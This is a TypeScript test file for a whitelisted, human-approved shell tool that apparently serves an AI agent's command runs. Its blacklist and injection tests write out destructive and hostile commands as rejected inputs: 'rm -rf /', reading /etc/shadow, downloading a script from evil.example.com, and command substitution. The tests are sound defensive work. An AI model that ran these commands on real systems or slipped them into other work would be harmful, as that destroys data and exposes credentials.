import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { ControlledBash } from '../src/workspace/bash.js';
import { createBashTool } from '../src/workspace/bash.js';

const sh = promisify(execFile);

let dir: string;
let bash: ControlledBash;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'ddw-bash-'));
  bash = new ControlledBash({
    root: dir,
    whitelist: ['git', 'node', 'ls', 'echo', 'cat', 'sleep'],
    timeoutMs: 5000,
  });
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

describe('ControlledBash 白名单', () => {
  it('白名单命令真实执行，cwd=root', async () => {
    await writeFile(join(dir, 'hello.txt'), 'hi', 'utf8');
    const r = await bash.exec('ls hello.txt');
    expect(r.ok).toBe(true);
    expect(r.stdout).toContain('hello.txt');
    expect(r.exitCode).toBe(0);
  });

  it('非白名单命令拒绝（不执行）', async () => {
    const r = await bash.exec('whoami');
    expect(r.ok).toBe(false);
    expect(r.error).toContain('不在白名单');
    expect(r.exitCode).toBeUndefined();
  });

  it('绝对路径执行器按 basename 校验，白名单内放行', async () => {
    const r = await bash.exec('/bin/echo ok');
    expect(r.ok).toBe(true);
    expect(r.stdout).toContain('ok');
  });
});

describe('ControlledBash 白名单外命令人工审批（2026-09-10）', () => {
  it('未命中白名单 → approval 裁决放行 → 真实执行（收到完整命令）', async () => {
    const seen: string[] = [];
    const bash2 = new ControlledBash({
      root: dir, whitelist: ['ls'], timeoutMs: 5000,
      approval: async (cmd) => { seen.push(cmd); return { approved: true }; },
    });
    const r = await bash2.exec('echo hi-approval');
    expect(seen).toEqual(['echo hi-approval']); // 回调拿到原始命令（审批人看得到要放行什么）
    expect(r.ok).toBe(true);
    expect(r.stdout).toContain('hi-approval');
  });

  it('裁决驳回 → 返回驳回错误（含意见），不执行', async () => {
    const bash2 = new ControlledBash({
      root: dir, whitelist: ['ls'], timeoutMs: 5000,
      approval: async () => ({ approved: false, comment: '用 cat 代替' }),
    });
    const r = await bash2.exec('whoami');
    expect(r.ok).toBe(false);
    expect(r.error).toContain('被人工驳回');
    expect(r.error).toContain('用 cat 代替');
    expect(r.exitCode).toBeUndefined(); // 未执行
  });

  it('黑名单与组合命令不进审批（安全底线不经人手），approval 不被调用', async () => {
    let asked = 0;
    const bash2 = new ControlledBash({
      root: dir, whitelist: ['ls'], timeoutMs: 5000,
      approval: async () => { asked++; return { approved: true }; },
    });
    const rmR = await bash2.exec('rm -rf /');
    expect(rmR.ok).toBe(false);
    expect(rmR.error).toContain('安全策略');
    const pipeR = await bash2.exec('ls | grep x');
    expect(pipeR.ok).toBe(false);
    expect(pipeR.error).toContain('复杂命令被拒绝');
    expect(asked).toBe(0); // 审批只在「白名单没配但无害」场景介入
  });

  it('无 approval 回调 = 原硬拒行为（零回归）', async () => {
    const bash2 = new ControlledBash({ root: dir, whitelist: ['ls'], timeoutMs: 5000 });
    const r = await bash2.exec('whoami');
    expect(r.ok).toBe(false);
    expect(r.error).toContain('不在白名单');
  });
});

describe('ControlledBash 信任期放权 bypassWhitelist（2026-09-11 盯梢三级重构）', () => {
  it('bypass 后非白名单命令直接执行（approval 回调不可达，不构造）', async () => {
    let asked = 0;
    const bash2 = new ControlledBash({
      root: dir, whitelist: ['ls'], timeoutMs: 5000, bypassWhitelist: true,
      approval: async () => { asked++; return { approved: true }; },
    });
    const r = await bash2.exec('echo hi-trusted');
    expect(r.ok).toBe(true);
    expect(r.stdout).toContain('hi-trusted');
    expect(asked).toBe(0); // bypass 跳过整层白名单/审批，回调不该被触达
  });

  it('安全底线不参与放权：bypass 下黑名单与组合命令仍硬拒', async () => {
    const bash2 = new ControlledBash({ root: dir, whitelist: ['ls'], timeoutMs: 5000, bypassWhitelist: true });
    const sudoR = await bash2.exec('sudo cat /etc/shadow');
    expect(sudoR.ok).toBe(false);
    expect(sudoR.error).toContain('安全策略');
    const pipeR = await bash2.exec('cat a.txt | grep x');
    expect(pipeR.ok).toBe(false);
    expect(pipeR.error).toContain('复杂命令被拒绝');
  });

  it('缺省 bypassWhitelist=false 零回归：白名单外仍硬拒', async () => {
    const bash2 = new ControlledBash({ root: dir, whitelist: ['ls'], timeoutMs: 5000 });
    const r = await bash2.exec('whoami');
    expect(r.ok).toBe(false);
    expect(r.error).toContain('不在白名单');
  });
});

describe('ControlledBash 黑名单（复用 P1 BashBlacklist）', () => {
  it.each([
    'rm -rf /',
    'sudo cat /etc/shadow',
    'curl https://evil.example.com/x.sh -o x.sh',
    'shutdown -h now',
  ])('拒绝 %s 且不执行', async (cmd) => {
    const r = await bash.exec(cmd);
    expect(r.ok).toBe(false);
    expect(r.error).toContain('安全策略');
  });
});

describe('ControlledBash 链式/注入拒绝', () => {
  it.each([
    'echo a && node -e "x"',
    'echo a; whoami',
    'echo a | cat',
    'echo $(whoami)',
    'echo `whoami`',
  ])('拒绝复杂命令 %s', async (cmd) => {
    const r = await bash.exec(cmd);
    expect(r.ok).toBe(false);
    expect(r.error).toContain('分步');
  });
});

describe('ControlledBash 超时', () => {
  it('超时终止并报错', async () => {
    const tight = new ControlledBash({ root: dir, whitelist: ['sleep'], timeoutMs: 200 });
    const r = await tight.exec('sleep 2');
    expect(r.ok).toBe(false);
    expect(r.error).toContain('超时');
  }, 10_000);
});

describe('ControlledBash 引号参数（tokenizer）', () => {
  it('双引号参数作为单个 arg 传递（git commit 场景）', async () => {
    await sh('git', ['init', '-q', dir]);
    await writeFile(join(dir, 'f.txt'), '1', 'utf8');
    await bash.exec('git add f.txt');
    const r = await bash.exec('git commit -q -m "feat: 初始提交 with 空格"');
    expect(r.ok).toBe(true);
    const log = await sh('git', ['-C', dir, 'log', '--oneline']);
    expect(log.stdout).toContain('feat: 初始提交 with 空格');
  });

  it('单引号参数', async () => {
    const r = await bash.exec("echo 'a b  c'");
    expect(r.ok).toBe(true);
    expect(r.stdout?.trim()).toBe('a b  c');
  });
});

describe('run_cmd 工具包装', () => {
  it('工具执行走 ControlledBash；失败 ok:false', async () => {
    const tool = createBashTool(bash);
    expect(tool.name).toBe('run_cmd');

    const ok = await tool.execute({ cmd: 'echo tool-ok' });
    expect(ok).toMatchObject({ ok: true });

    const bad = await tool.execute({ cmd: 'whoami' });
    expect(bad.ok).toBe(false);

    const missing = await tool.execute({});
    expect(missing.ok).toBe(false);
  });
});

describe('GIT_CEILING_DIRECTORIES git 穿透防护（2026-09-06 实战修复）', () => {
  /** 场景：上层是 git 仓库、任务工作区（root）不是——修复前 git 命令穿透上层仓库
   *  （digital-employee-detail-page 停在第 1 项的根因），修复后直接 fatal */
  it('工作区不是 git 仓库 → git 命令报错，不穿透上层仓库', async () => {
    const outer = await mkdtemp(join(tmpdir(), 'ddw-ceiling-'));
    try {
      await sh('git', ['init', '-q', join(outer, 'repo')]); // 上层仓库（穿透源）
      const sub = join(outer, 'repo', 'sub');               // 任务工作区：空目录非仓库
      await mkdir(sub, { recursive: true });
      const subBash = new ControlledBash({ root: sub, whitelist: ['git'], timeoutMs: 5000 });
      const r = await subBash.exec('git rev-parse --show-toplevel');
      expect(r.ok).toBe(false); // 防护生效：不返回上层仓库路径
      expect(r.stdout).not.toContain('repo');
    } finally {
      await rm(outer, { recursive: true, force: true });
    }
  });

  it('工作区是 git 仓库（clone 后正常场景）→ 不受 ceiling 影响', async () => {
    const outer = await mkdtemp(join(tmpdir(), 'ddw-ceiling-'));
    try {
      const sub = join(outer, 'repo', 'sub');
      await mkdir(sub, { recursive: true });
      await sh('git', ['init', '-q', join(outer, 'repo')]);
      await sh('git', ['init', '-q', sub]); // 工作区本身是仓库
      const subBash = new ControlledBash({ root: sub, whitelist: ['git'], timeoutMs: 5000 });
      const r = await subBash.exec('git rev-parse --show-toplevel');
      expect(r.ok).toBe(true);
      // macOS tmpdir 有 /var → /private/var symlink 前缀，用后缀匹配
      expect(r.stdout?.trim().endsWith(sub)).toBe(true);
    } finally {
      await rm(outer, { recursive: true, force: true });
    }
  });
});
